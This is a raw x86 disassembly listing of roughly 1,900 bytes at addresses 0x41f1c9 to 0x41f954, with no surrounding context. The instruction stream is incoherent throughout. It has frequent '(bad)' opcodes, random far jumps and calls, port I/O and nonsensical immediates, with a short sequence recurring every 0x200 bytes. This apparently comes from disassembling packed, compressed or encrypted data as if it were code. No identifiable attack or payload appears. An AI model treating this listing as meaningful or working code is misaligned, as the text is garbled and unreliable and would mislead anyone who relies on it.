  41f1c9:	sub    ah,BYTE PTR [edi+ebx*2]
  41f1cc:	ins    DWORD PTR es:[edi],dx
  41f1cd:	cmp    al,0x53
  41f1cf:	jmp    0x41f1e9
  41f1d1:	push   0x5d060d5b
  41f1d6:	rcr    BYTE PTR [edx-0x26],1
  41f1d9:	xor    esp,eax
  41f1db:	add    cl,BYTE PTR [eax-0x32cbef62]
  41f1e1:	adc    eax,0x3deec8b8
  41f1e6:	adc    BYTE PTR [eax+0x24],ch
  41f1e9:	jne    0x41f1eb
  41f1eb:	dec    eax
  41f1ec:	in     al,0x3
  41f1ee:	fwait
  41f1ef:	scas   eax,DWORD PTR es:[edi]
  41f1f0:	(bad)  
  41f1f1:	fdiv   st,st(7)
  41f1f3:	pop    esi
  41f1f4:	sub    BYTE PTR [eax-0x34bf5c71],bl
  41f1fa:	ret    0xc0a8
  41f1fd:	add    DWORD PTR [eax],eax
  41f1ff:	out    0x1,eax
  41f201:	add    BYTE PTR [eax],al
  41f203:	(bad)  
  41f204:	jae    0x41f209
  41f206:	sbb    DWORD PTR [eax-0x2f1051da],ebp
  41f20c:	lods   eax,DWORD PTR ds:[esi]
  41f20d:	enter  0x450c,0xfb
  41f211:	daa    
  41f212:	lock fmul DWORD PTR [ebp-0x28]
  41f216:	sub    al,dl
  41f218:	lock in eax,dx
  41f21a:	and    BYTE PTR [eax*4+0x5bd5c2be],cl
  41f221:	mov    eax,ds:0x54ee5c39
  41f226:	jne    0x41f200
  41f228:	out    dx,eax
  41f229:	fcomp  DWORD PTR [esi]
  41f22b:	(bad)
  41f22e:	retf   0x37c0
  41f231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f232:	mov    ds:0x24f01576,eax
  41f237:	shl    BYTE PTR [eax-0x4b],0x32
  41f23b:	mov    esp,0x6f807f04
  41f240:	lea    ebp,[ecx]
  41f242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f243:	mov    ecx,0x8ec3d870
  41f248:	mov    dl,0xca
  41f24a:	xchg   esp,eax
  41f24b:	scas   eax,DWORD PTR es:[edi]
  41f24c:	ins    BYTE PTR es:[edi],dx
  41f24d:	fisub  DWORD PTR [edi]
  41f24f:	mul    BYTE PTR [ecx]
  41f251:	xor    DWORD PTR [esp+ecx*2+0x755d3c9f],esp
  41f258:	xchg   BYTE PTR [edx+0x23],ch
  41f25b:	xor    edx,DWORD PTR [edi]
  41f25d:	push   esi
  41f25e:	sbb    cl,dl
  41f260:	retf   
  41f261:	mov    ah,BYTE PTR [ebp-0x290b811c]
  41f267:	(bad)  
  41f269:	imul   ebx,DWORD PTR [edi-0x32c414c6],0x12
  41f270:	mov    bl,0x9d
  41f272:	pop    ss
  41f273:	mov    ebp,0xc80aee4e
  41f278:	sbb    bl,BYTE PTR [edx+eiz*4-0x25]
  41f27c:	(bad)  
  41f27d:	sbb    al,0x32
  41f27f:	xchg   edx,eax
  41f280:	aaa    
  41f281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f282:	std    
  41f283:	call   0x6435a1bb
  41f288:	es into 
  41f28a:	xor    al,0x59
  41f28c:	lds    ebx,FWORD PTR [esi]
  41f28e:	sbb    ch,bh
  41f290:	and    eax,0xa72614d2
  41f295:	js     0x41f312
  41f297:	dec    edx
  41f298:	or     esi,DWORD PTR [ecx-0x61]
  41f29b:	dec    ebx
  41f29c:	jb     0x41f2e1
  41f29e:	les    edx,FWORD PTR [ebp+0x46bf4533]
  41f2a4:	lea    edi,[ecx+0x53]
  41f2a7:	push   0xb4bdeb48
  41f2ac:	sbb    DWORD PTR [ecx],ecx
  41f2ae:	xor    eax,0x6c511e1f
  41f2b3:	mov    eax,0xb45d12d8
  41f2b8:	mov    ah,0x49
  41f2ba:	enter  0x80e3,0x58
  41f2be:	cmp    ebp,ebp
  41f2c0:	retfw  0x4d83
  41f2c4:	pop    esp
  41f2c5:	xor    ebx,esi
  41f2c7:	ins    BYTE PTR es:[edi],dx
  41f2c8:	(bad)  
  41f2c9:	shl    dh,cl
  41f2cb:	mov    esi,0xa11d85b0
  41f2d0:	imul   ecx,DWORD PTR [ebx-0x5],0x509b8db2
  41f2d7:	retf   0xd91
  41f2da:	xlat   BYTE PTR ds:[ebx]
  41f2db:	in     eax,0xb8
  41f2dd:	and    eax,0x3ddf16d
  41f2e2:	xor    BYTE PTR [eax-0x69],ch
  41f2e5:	lahf   
  41f2e6:	shl    BYTE PTR es:[edx],0x2d
  41f2ea:	dec    edi
  41f2eb:	fnstcw WORD PTR [esi]
  41f2ed:	sub    edx,DWORD PTR [ecx+0x70]
  41f2f0:	jmp    0x41f361
  41f2f2:	(bad)  [esi+ebx*2+0x53]
  41f2f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2f7:	dec    ebp
  41f2f8:	mov    esi,0x9f598290
  41f2fd:	jae    0x41f33a
  41f2ff:	(bad)  
  41f300:	jl     0x41f37c
  41f302:	ds add eax,0xc1659cfd
  41f308:	mov    ah,0xd
  41f30a:	cmp    eax,0x28eff540
  41f30f:	xor    ecx,DWORD PTR [ecx+0x42f3ada0]
  41f315:	(bad)  
  41f317:	push   esp
  41f318:	daa    
  41f319:	jns    0x41f385
  41f31b:	pop    ebx
  41f31c:	cwde   
  41f31d:	fcmovnu st,st(2)
  41f31f:	adc    eax,DWORD PTR [edi]
  41f321:	iret   
  41f322:	xlat   BYTE PTR ds:[ebx]
  41f323:	push   esi
  41f324:	fucomip st,st(7)
  41f326:	inc    eax
  41f327:	push   edi
  41f328:	xchg   esp,eax
  41f329:	imul   ebx,DWORD PTR [ebp-0x80],0xc7acf8d2
  41f330:	or     DWORD PTR [edi],eax
  41f332:	(bad)  
  41f333:	int3   
  41f334:	dec    edx
  41f335:	cmc    
  41f336:	mov    ah,0xde
  41f338:	lds    esi,FWORD PTR [ebx]
  41f33a:	retf   
  41f33b:	cs xchg ecx,eax
  41f33d:	mov    dh,0xe5
  41f33f:	out    0xb2,al
  41f341:	dec    ebp
  41f342:	xchg   esi,eax
  41f343:	out    0xe8,al
  41f345:	clc    
  41f346:	pusha  
  41f347:	out    dx,eax
  41f348:	arpl   WORD PTR ds:0xf1ed261b,bx
  41f34e:	mov    cl,0x94
  41f350:	xchg   esi,eax
  41f351:	outs   dx,DWORD PTR ds:[esi]
  41f352:	xor    eax,0x33ecf084
  41f357:	mov    esi,DWORD PTR [edi-0x15]
  41f35a:	fdivr  st,st(2)
  41f35c:	adc    al,0x3a
  41f35e:	in     eax,dx
  41f35f:	nop
  41f360:	jmp    0xb751:0xca5bc20c
  41f367:	nop
  41f368:	inc    esp
  41f369:	ret    
  41f36a:	test   BYTE PTR [esi-0x37],bh
  41f36d:	popf   
  41f36e:	push   eax
  41f36f:	push   esi
  41f370:	std    
  41f371:	cs mov bh,0x78
  41f374:	fiadd  WORD PTR [ecx+0x7f5841bf]
  41f37a:	cmp    bl,BYTE PTR [edx]
  41f37c:	jle    0x41f338
  41f37e:	and    ch,BYTE PTR [edx]
  41f380:	bound  eax,QWORD PTR [edx]
  41f382:	jp     0x41f3b1
  41f384:	add    DWORD PTR [ecx],ebp
  41f386:	mov    WORD PTR [ebx+0x69],ds
  41f389:	pop    ebx
  41f38a:	push   eax
  41f38b:	jecxz  0x41f3cc
  41f38d:	mov    WORD PTR [ebx-0x49],es
  41f390:	inc    ebx
  41f391:	(bad)
  41f395:	mov    dh,0x49
  41f397:	add    bl,dl
  41f399:	xchg   ebx,eax
  41f39a:	mov    eax,esi
  41f39c:	shr    esi,0x9e
  41f39f:	inc    edi
  41f3a0:	fadd   DWORD PTR [ebp+0x3f2b5081]
  41f3a6:	ds inc eax
  41f3a8:	ins    BYTE PTR es:[edi],dx
  41f3a9:	and    BYTE PTR [ecx],ch
  41f3ab:	shl    BYTE PTR [edi+0x1aa18111],0xaf
  41f3b2:	pop    ss
  41f3b3:	loope  0x41f38b
  41f3b5:	inc    ebp
  41f3b6:	dec    esi
  41f3b7:	shl    BYTE PTR ds:0xbf19ed04,0x7d
  41f3be:	sbb    ah,BYTE PTR [esi-0xb]
  41f3c1:	adc    eax,0x316647b
  41f3c6:	loopne 0x41f39d
  41f3c8:	jno    0x41f3e3
  41f3ca:	jle    0x41f36b
  41f3cc:	ins    BYTE PTR es:[edi],dx
  41f3cd:	div    BYTE PTR [edi-0x4d510733]
  41f3d3:	out    dx,eax
  41f3d4:	les    edi,FWORD PTR [ecx-0x1b55033e]
  41f3da:	mov    esi,0x33d4add4
  41f3df:	adc    BYTE PTR [edx-0x2b],dl
  41f3e2:	jae    0x41f368
  41f3e4:	sub    ebx,DWORD PTR [edx+eiz*2]
  41f3e7:	and    edx,DWORD PTR [esi+0x51]
  41f3ea:	add    BYTE PTR [edx+0x4],dl
  41f3ed:	mov    ds:0x72a6f682,al
  41f3f2:	aam    0x6d
  41f3f4:	xor    dh,BYTE PTR [edx]
  41f3f6:	and    eax,0xd487fd28
  41f3fb:	pop    edx
  41f3fd:	add    DWORD PTR [eax],eax
  41f3ff:	out    0x1,eax
  41f401:	add    BYTE PTR [eax],al
  41f403:	cmp    eax,0xe14871ce
  41f408:	ret    
  41f409:	cs in  al,dx
  41f40b:	mov    ecx,0xef60fab4
  41f410:	pushf  
  41f411:	cs xor al,0xf5
  41f414:	inc    eax
  41f415:	cdq    
  41f416:	xchg   esp,eax
  41f417:	cli    
  41f418:	fwait
  41f419:	popa   
  41f41a:	cmp    BYTE PTR [edi+0x7b],cl
  41f41d:	sti    
  41f41e:	pop    eax
  41f41f:	aad    0x77
  41f421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f422:	cmp    esp,DWORD PTR [esi-0x612f029d]
  41f428:	es jns 0x41f3f2
  41f42b:	xor    eax,0x13d8a65a
  41f430:	out    0x9,eax
  41f432:	mov    DWORD PTR [ecx],ebx
  41f434:	loop   0x41f457
  41f436:	xor    bh,dh
  41f438:	inc    esi
  41f439:	lods   eax,DWORD PTR ds:[esi]
  41f43a:	jmp    0xc5e2ef88
  41f43f:	fdiv   QWORD PTR [eax]
  41f441:	jecxz  0x41f44b
  41f443:	xor    BYTE PTR [ebx-0xed7aa15],bh
  41f449:	stos   DWORD PTR es:[edi],eax
  41f44a:	sahf   
  41f44b:	pop    DWORD PTR [ebp+esi*2-0x1711c151]
  41f452:	jns    0x41f3d9
  41f454:	call   0x9a39:0x21bbc706
  41f45b:	mov    ah,0xc
  41f45d:	lods   al,BYTE PTR ds:[esi]
  41f45e:	shr    DWORD PTR [ecx+0x543ea5fc],1
  41f464:	push   esp
  41f465:	xchg   eax,edi
  41f467:	out    0x1b,eax
  41f469:	dec    edi
  41f46a:	push   ebx
  41f46b:	and    al,0x1a
  41f46d:	mov    ebx,0x3697808d
  41f472:	rcr    BYTE PTR [eax-0x6470cb67],cl
  41f478:	inc    ebx
  41f479:	repz js 0x41f429
  41f47c:	push   ds
  41f47d:	shr    DWORD PTR [edi],1
  41f47f:	mov    dh,bl
  41f481:	pop    edx
  41f482:	fdivrp st(6),st
  41f484:	imul   esp,ecx,0x15185d93
  41f48a:	sub    ah,cl
  41f48c:	inc    edx
  41f48d:	int3   
  41f48e:	xor    DWORD PTR [ebx+0x6ee044e],edx
  41f494:	and    BYTE PTR [eax+esi*1],bh
  41f497:	or     BYTE PTR [ebx+0x4c1adc6b],dh
  41f49d:	xchg   ecx,eax
  41f49e:	inc    ebp
  41f49f:	rol    BYTE PTR [esi],1
  41f4a1:	push   esi
  41f4a2:	jge    0x41f454
  41f4a4:	add    al,0xa2
  41f4a6:	mov    al,ds:0x81fdbac8
  41f4ab:	mov    dl,0x5
  41f4ad:	pop    esp
  41f4ae:	cmc    
  41f4af:	mov    WORD PTR [edi+0x39],ds
  41f4b2:	xor    al,0x7c
  41f4b4:	iret   
  41f4b5:	pop    ss
  41f4b6:	mov    edx,0x4ef6183b
  41f4bb:	inc    esi
  41f4bc:	adc    BYTE PTR [ecx-0x6707193a],bl
  41f4c2:	sub    bh,BYTE PTR [edx-0x4696d63f]
  41f4c8:	xchg   edx,eax
  41f4c9:	cmp    eax,0x897f6612
  41f4ce:	push   cs
  41f4cf:	loopne 0x41f486
  41f4d1:	adc    BYTE PTR [ebp+0x2bb197c1],bh
  41f4d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4d8:	fdivr  DWORD PTR [esi-0x2b]
  41f4db:	fst    DWORD PTR [esi]
  41f4dd:	and    BYTE PTR [esi-0x48],cl
  41f4e0:	add    al,0x40
  41f4e2:	test   DWORD PTR [eax],0x26e5ad4d
  41f4e8:	inc    esp
  41f4e9:	pop    edx
  41f4ea:	pop    ebx
  41f4eb:	jl     0x41f4c5
  41f4ed:	popf   
  41f4ee:	add    dh,BYTE PTR [edi]
  41f4f0:	call   0x8812:0x746e19ad
  41f4f7:	mov    ecx,0x21ccf28d
  41f4fc:	push   DWORD PTR [ebx+esi*2+0x47]
  41f500:	jbe    0x41f4ad
  41f502:	fidivr DWORD PTR [edi-0x126b36c9]
  41f508:	jne    0x41f490
  41f50a:	cmp    edi,ecx
  41f50c:	add    DWORD PTR [ecx+0x59],ebp
  41f50f:	mov    edx,ss
  41f511:	inc    esp
  41f512:	dec    ecx
  41f513:	add    BYTE PTR [eax-0x7d],0x78
  41f517:	out    dx,eax
  41f518:	mov    edi,0x76ffeed
  41f51d:	xor    esp,DWORD PTR [eax]
  41f51f:	(bad)  
  41f521:	mov    ds:0x24d5bfdc,al
  41f526:	jno    0x41f560
  41f528:	pop    edi
  41f529:	add    BYTE PTR [esi-0x1b],al
  41f52c:	int3   
  41f52d:	out    0x2f,eax
  41f52f:	mov    ds:0x7841ff3a,al
  41f534:	inc    ebp
  41f535:	jecxz  0x41f50c
  41f537:	sub    eax,0xf81e8c3e
  41f53c:	adc    al,BYTE PTR [eax]
  41f53e:	jns    0x41f4c9
  41f540:	jne    0x41f590
  41f542:	nop
  41f543:	mov    cl,0x2c
  41f545:	stc    
  41f546:	inc    eax
  41f547:	nop
  41f548:	dec    ecx
  41f549:	cmp    DWORD PTR [edx-0x4a225b1f],edi
  41f54f:	inc    edx
  41f550:	xchg   ecx,eax
  41f551:	and    edx,DWORD PTR [ebx+0x1235fa23]
  41f557:	fwait
  41f558:	lss    esi,FWORD PTR cs:[ebx+0x7f]
  41f55d:	imul   DWORD PTR ds:0xed56f809
  41f563:	mov    ds:0xbbef2100,al
  41f568:	jecxz  0x41f5d6
  41f56a:	dec    edi
  41f56b:	xor    eax,0x3808fc7
  41f571:	sahf   
  41f572:	xchg   esi,eax
  41f573:	aaa    
  41f574:	pop    ds
  41f575:	cdq    
  41f576:	sub    eax,0xa0b4d69e
  41f57b:	rol    DWORD PTR [ebp+0x33d1414f],1
  41f581:	dec    esp
  41f582:	mov    bl,0x7e
  41f584:	adc    eax,0x3ab726c6
  41f589:	ror    DWORD PTR [esp+edx*8+0x415fe005],0x3
  41f591:	dec    ebx
  41f592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f593:	out    dx,eax
  41f594:	aad    0x66
  41f596:	scas   eax,DWORD PTR es:[edi]
  41f597:	push   ds
  41f598:	sub    al,0xa0
  41f59a:	inc    esp
  41f59b:	test   BYTE PTR [esi],ch
  41f59d:	test   eax,0xa45c3171
  41f5a2:	xchg   ebp,eax
  41f5a3:	(bad)  
  41f5a4:	dec    edx
  41f5a5:	push   0x75
  41f5a7:	cmp    eax,0x6569655
  41f5ac:	mov    ebx,DWORD PTR [ecx+0x4d]
  41f5af:	add    edx,DWORD PTR [ecx+0x15]
  41f5b2:	cld    
  41f5b3:	xor    DWORD PTR es:[ecx-0x457443d9],ebx
  41f5ba:	jl     0x41f561
  41f5bc:	ror    ah,0x68
  41f5bf:	sbb    al,0x33
  41f5c1:	mov    esi,0x290d6693
  41f5c6:	aaa    
  41f5c7:	pop    ds
  41f5c8:	pop    edx
  41f5c9:	outs   dx,BYTE PTR ds:[esi]
  41f5ca:	cld    
  41f5cb:	mov    ebp,0x70751db6
  41f5d0:	cli    
  41f5d1:	ins    BYTE PTR es:[edi],dx
  41f5d2:	xchg   ebp,eax
  41f5d3:	les    ebx,FWORD PTR [edi+0x4f88aabe]
  41f5d9:	push   ds
  41f5da:	pop    ecx
  41f5db:	sbb    edi,DWORD PTR [edx-0x29]
  41f5de:	mov    gs,WORD PTR [ebx-0xeabaf76]
  41f5e4:	cmp    edi,DWORD PTR [edi+0x3a]
  41f5e7:	and    eax,0x38000abb
  41f5ec:	push   0xffffff96
  41f5ee:	add    edx,esi
  41f5f0:	(bad)  
  41f5f1:	mov    ebp,0xdb4ef67b
  41f5f6:	out    0xfe,eax
  41f5f8:	lea    esi,[ebx]
  41f5fa:	ins    BYTE PTR es:[edi],dx
  41f5fb:	jbe    0x41f5c1
  41f5fd:	add    DWORD PTR [eax],eax
  41f5ff:	out    0x1,eax
  41f601:	add    BYTE PTR [eax],al
  41f603:	ds out dx,eax
  41f605:	sar    BYTE PTR [ebx-0x6a],1
  41f608:	inc    eax
  41f609:	sbb    BYTE PTR [esi],0x2
  41f60c:	mov    esp,0xd9235eb5
  41f612:	sub    eax,0xd7b0ed2f
  41f617:	xchg   ebp,eax
  41f618:	or     ecx,DWORD PTR [esi+0x41dd43f1]
  41f61e:	es inc ebp
  41f620:	out    dx,al
  41f621:	neg    edi
  41f623:	lahf   
  41f624:	sbb    ebx,DWORD PTR [eax-0x6f]
  41f627:	push   es
  41f628:	add    ebp,ebx
  41f62a:	push   es
  41f62b:	sub    edi,DWORD PTR [ecx]
  41f62d:	push   cs
  41f62e:	cmp    al,0x17
  41f630:	iret   
  41f631:	(bad)  
  41f632:	cmp    dh,BYTE PTR [ecx+edx*2+0x50]
  41f636:	lods   al,BYTE PTR ds:[esi]
  41f637:	daa    
  41f638:	dec    eax
  41f639:	lock out 0xfc,al
  41f63c:	jecxz  0x41f67c
  41f63e:	mov    BYTE PTR [ebx-0x7c],bh
  41f641:	inc    ebx
  41f642:	cli    
  41f643:	or     DWORD PTR [esi+0x3cc9b599],ebp
  41f649:	add    DWORD PTR [eax+ebp*2-0x25],0x5012a4e6
  41f651:	mov    bh,0x81
  41f653:	mov    edx,0x96c9dba2
  41f658:	push   0xd6350fbd
  41f65d:	imul   edx,DWORD PTR [esp+edx*1],0x3db2073b
  41f664:	add    al,0x27
  41f666:	mov    esp,0xf531bf9a
  41f66b:	add    BYTE PTR ds:0x4bfc93e,0x6d
  41f672:	adc    DWORD PTR [ebx+0x7a],ebp
  41f675:	jp     0x41f607
  41f677:	lea    esp,[ebp-0x9516b29]
  41f67d:	inc    edx
  41f67e:	imul   esp,DWORD PTR [ebx-0x18],0xc7c778c6
  41f685:	dec    ebp
  41f686:	aas    
  41f687:	clc    
  41f688:	jge    0x41f614
  41f68a:	sub    eax,0x85cb2a8
  41f68f:	jbe    0x41f6f4
  41f691:	lahf   
  41f692:	scas   al,BYTE PTR es:[edi]
  41f693:	jnp    0x41f6ba
  41f695:	pop    ds
  41f696:	xlat   BYTE PTR ds:[ebx]
  41f697:	into   
  41f698:	jl     0x41f67e
  41f69a:	push   0xffffffb4
  41f69c:	push   esp
  41f69d:	(bad)
  41f6a1:	adc    dh,BYTE PTR [ebx]
  41f6a3:	fwait
  41f6a4:	repnz rcr BYTE PTR [eax],0xbf
  41f6a8:	arpl   WORD PTR [esi+0x38e234e],dx
  41f6ae:	int3   
  41f6af:	stc    
  41f6b0:	icebp  
  41f6b1:	popa   
  41f6b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6b3:	pop    ecx
  41f6b4:	add    eax,0x7866243a
  41f6b9:	dec    ecx
  41f6ba:	leave  
  41f6bb:	pop    ebp
  41f6bc:	pop    ss
  41f6bd:	fucomp st(3)
  41f6bf:	xor    al,0xde
  41f6c1:	mov    eax,ds:0xda26799
  41f6c6:	adc    eax,0x1c6c6712
  41f6cb:	jmp    0xea16:0x498d2bd8
  41f6d2:	in     eax,0xa
  41f6d4:	fcmovb st,st(3)
  41f6d6:	cdq    
  41f6d7:	jbe    0x41f65a
  41f6d9:	jbe    0x41f6d5
  41f6db:	cld    
  41f6dc:	adc    BYTE PTR [ebp+0x62],0xd0
  41f6e0:	inc    esp
  41f6e1:	push   edi
  41f6e2:	in     eax,dx
  41f6e3:	cs dec edx
  41f6e5:	ins    BYTE PTR es:[edi],dx
  41f6e6:	sub    BYTE PTR [edi+0x24],ah
  41f6e9:	call   FWORD PTR ss:0x55f8c9a1
  41f6f0:	sti    
  41f6f1:	cmp    eax,0x2ad84e6a
  41f6f6:	xor    DWORD PTR [ecx],edi
  41f6f8:	call   0xa4895994
  41f6fd:	(bad)  
  41f6ff:	pop    ds
  41f700:	push   es
  41f701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f702:	cmp    DWORD PTR [ebx-0x28],esp
  41f705:	into   
  41f706:	popa   
  41f707:	vmovlpd QWORD PTR ds:0xce1a0257,xmm1
  41f70f:	cmp    eax,0x59d63bc0
  41f714:	jnp    0x41f6a3
  41f716:	les    ecx,FWORD PTR [esi]
  41f718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f719:	je     0x41f6e0
  41f71b:	adc    dl,BYTE PTR [ebx]
  41f71d:	test   DWORD PTR [ebp+0x34],ebp
  41f720:	test   BYTE PTR [ebx+0x26e78808],0xdd
  41f727:	xlat   BYTE PTR ds:[ebx]
  41f728:	loop   0x41f740
  41f72a:	push   bx
  41f72c:	ins    BYTE PTR es:[edi],dx
  41f72d:	jmp    0x1dde:0x7a34eb46
  41f734:	cwde   
  41f735:	js     0x41f6fc
  41f737:	xchg   ebx,eax
  41f738:	jnp    0x41f70d
  41f73a:	mov    ebx,0x321660f7
  41f73f:	dec    edi
  41f740:	jae    0x41f6f6
  41f742:	jmp    0x65192c
  41f747:	call   0x2bb0:0x8f5152f3
  41f74e:	pop    esp
  41f74f:	jle    0x41f7bc
  41f751:	cmp    al,0x1f
  41f753:	fiadd  DWORD PTR [edi+edx*1-0x351b131d]
  41f75a:	adc    BYTE PTR cs:[esi],0x4c
  41f75e:	pop    ecx
  41f75f:	int    0x2e
  41f761:	jae    0x41f7d4
  41f763:	xor    bh,BYTE PTR [eax+0x6e]
  41f766:	mov    ecx,0x55bb17e7
  41f76b:	retf   0x47bd
  41f76e:	inc    edx
  41f76f:	adc    BYTE PTR [ebx-0x164606d1],ch
  41f775:	imul   eax,DWORD PTR [ecx+0x1b],0x9
  41f779:	xor    BYTE PTR ds:0x3337c2d4,dl
  41f77f:	adc    dl,BYTE PTR [ecx+edx*2]
  41f782:	add    edi,DWORD PTR ds:0x7c12ca1
  41f788:	mov    ah,0xca
  41f78a:	addr16 fcom QWORD PTR [bp+0x77]
  41f78f:	push   0x73e396e7
  41f794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f795:	sbb    bl,BYTE PTR ds:0x1ff07668
  41f79b:	xchg   edi,eax
  41f79c:	adc    al,0xda
  41f79e:	mov    bl,0xc9
  41f7a0:	retf   
  41f7a1:	sub    BYTE PTR [ebp-0x2b],bh
  41f7a4:	enter  0xf19b,0xb3
  41f7a8:	cli    
  41f7a9:	sbb    al,0xe8
  41f7ab:	cmp    dl,BYTE PTR [eax]
  41f7ad:	adc    eax,0x4c5b12b2
  41f7b2:	mov    ds:0x9b08a596,al
  41f7b7:	popa   
  41f7b8:	dec    ecx
  41f7b9:	call   0x6314:0xaf67007f
  41f7c0:	fcmove st,st(1)
  41f7c2:	mov    ecx,0xcb9b6ded
  41f7c7:	ret    0xc40d
  41f7ca:	xchg   edx,eax
  41f7cb:	mov    al,ds:0x5642b020
  41f7d0:	jne    0x41f7c6
  41f7d2:	lods   eax,DWORD PTR ds:[esi]
  41f7d3:	aad    0xea
  41f7d5:	dec    esp
  41f7d6:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41f7d8:	fild   WORD PTR [eax+esi*1+0x78f6af05]
  41f7df:	mov    ch,0x68
  41f7e1:	test   eax,0xb89e1216
  41f7e6:	cld    
  41f7e7:	dec    ch
  41f7e9:	cmp    BYTE PTR [eax],al
  41f7eb:	jmp    0x7a7272a9
  41f7f0:	repz jmp 0x41f7ec
  41f7f3:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41f7f7:	repz jbe 0x41f77b
  41f7fa:	ret    0xc65d
  41f7fd:	add    DWORD PTR [eax],eax
  41f7ff:	out    0x1,eax
  41f801:	add    BYTE PTR [eax],al
  41f803:	jecxz  0x41f7b7
  41f805:	push   0x63
  41f807:	inc    esp
  41f808:	popa   
  41f809:	cli    
  41f80a:	ficomp WORD PTR [edx]
  41f80c:	out    0xdb,al
  41f80e:	push   edx
  41f80f:	pop    eax
  41f810:	cmp    ebp,DWORD PTR [ecx-0x66456b3c]
  41f816:	mov    cl,0xa9
  41f818:	not    dh
  41f81a:	and    cl,BYTE PTR [edx+esi*1-0x5bda6a3b]
  41f821:	out    dx,al
  41f822:	pop    edx
  41f823:	add    esp,edi
  41f825:	dec    ebp
  41f826:	loopne 0x41f87b
  41f828:	je     0x41f877
  41f82a:	inc    edi
  41f82b:	pop    ss
  41f82c:	inc    eax
  41f82d:	xor    BYTE PTR [eax-0x5e],bl
  41f830:	test   BYTE PTR [ebp+0x4],al
  41f833:	pop    ds
  41f834:	pop    ds
  41f835:	or     BYTE PTR [edi-0x1f41294a],0xdf
  41f83c:	shl    BYTE PTR [ecx],cl
  41f83e:	ror    DWORD PTR [edi],1
  41f840:	cmovl  edx,DWORD PTR [ecx+0x48]
  41f844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f845:	rcl    DWORD PTR [ebx+0x51965178],1
  41f84b:	push   es
  41f84c:	mov    ah,0xbf
  41f84e:	push   es
  41f84f:	mov    edi,0xbec06923
  41f854:	in     al,0x55
  41f856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f857:	add    al,0x43
  41f859:	sub    BYTE PTR [edx+0x66],ch
  41f85c:	sub    esp,esi
  41f85e:	add    eax,DWORD PTR [ebx-0x4dd2c734]
  41f864:	inc    eax
  41f865:	fucomi st,st(5)
  41f867:	add    al,0x98
  41f869:	add    ah,BYTE PTR [eax+0x2896587]
  41f86f:	hlt    
  41f870:	sub    edi,edi
  41f872:	ficom  WORD PTR ds:0xf51bce2f
  41f878:	nop
  41f879:	ins    BYTE PTR es:[edi],dx
  41f87a:	mov    cs,WORD PTR [edi]
  41f87c:	xchg   ebx,eax
  41f87d:	and    DWORD PTR ds:[edi],eax
  41f880:	sahf   
  41f881:	sub    al,0x82
  41f883:	test   al,0x56
  41f885:	in     eax,dx
  41f886:	test   DWORD PTR [esi+ebx*4-0x2a040c9],eax
  41f88d:	dec    ecx
  41f88e:	mov    bl,BYTE PTR [ecx+eax*2]
  41f891:	addr16 xchg ebx,eax
  41f893:	xor    DWORD PTR [edx],edi
  41f895:	adc    al,0xbf
  41f897:	mov    dl,0x81
  41f899:	mov    edi,0xd5aa4475
  41f89e:	jg     0x41f859
  41f8a0:	sbb    DWORD PTR ds:0xfceba420,edx
  41f8a6:	xchg   BYTE PTR [ebp-0x65],dl
  41f8a9:	and    DWORD PTR [edi+edx*2-0x45b2002e],esi
  41f8b0:	iret   
  41f8b1:	retf   
  41f8b2:	repnz and eax,0x2ad4c2df
  41f8b8:	js     0x41f8a2
  41f8ba:	fist   DWORD PTR [ecx+eax*1+0x36ef3430]
  41f8c1:	call   0xec41:0xebf0715b
  41f8c8:	xor    dh,bh
  41f8ca:	cmp    al,0x9f
  41f8cc:	leave  
  41f8cd:	or     bl,bh
  41f8cf:	sub    eax,0xd1380757
  41f8d4:	mov    bh,0x6e
  41f8d6:	sahf   
  41f8d7:	and    al,0xbe
  41f8d9:	xor    edx,DWORD PTR [esi]
  41f8db:	push   esi
  41f8dc:	fnstsw WORD PTR [ebx+0x6a]
  41f8df:	xlat   BYTE PTR ds:[ebx]
  41f8e0:	mov    ds:0xe1d5f8bd,eax
  41f8e5:	pushf  
  41f8e6:	jmp    0xc43238b8
  41f8eb:	sbb    eax,DWORD PTR [ecx]
  41f8ed:	and    dh,BYTE PTR [ecx-0x4]
  41f8f0:	data16 outs dx,BYTE PTR ds:[esi]
  41f8f2:	sub    eax,0x29c377
  41f8f7:	or     ebp,esp
  41f8f9:	mov    BYTE PTR [edi],bh
  41f8fb:	test   BYTE PTR [eax+0x410a3cf9],dh
  41f901:	pop    esp
  41f902:	xchg   DWORD PTR [edx],edx
  41f904:	add    DWORD PTR [eax+ebx*2+0x187e281],ebx
  41f90b:	ds mov eax,0xe9fb35a1
  41f911:	cli    
  41f912:	fcmovnu st,st(0)
  41f914:	pop    ebx
  41f915:	push   ecx
  41f916:	mov    ah,BYTE PTR [edx+esi*2]
  41f919:	repz mov cl,0x2
  41f91c:	rcl    DWORD PTR [ecx+eax*1],cl
  41f91f:	aam    0xf4
  41f921:	in     al,dx
  41f922:	(bad)  
  41f923:	mov    bl,BYTE PTR [edi+0x4d]
  41f926:	pop    ecx
  41f927:	jmp    0x2dfd37ba
  41f92c:	cmp    BYTE PTR [edx],dh
  41f92e:	dec    ebx
  41f92f:	or     eax,0x3a00e4c5
  41f934:	in     eax,dx
  41f935:	fcmovnu st,st(4)
  41f937:	inc    ecx
  41f938:	xchg   edi,eax
  41f939:	add    eax,0xd5829463
  41f93e:	in     eax,dx
  41f93f:	aam    0xf9
  41f941:	lods   al,BYTE PTR ds:[esi]
  41f942:	frstor [eax]
  41f944:	push   0x52
  41f946:	shl    DWORD PTR gs:[edx-0x58cc835c],1
  41f94d:	mov    eax,0xf9dcca45
  41f952:	pop    esp
  41f953:	sti    
  41f954:	cmc    
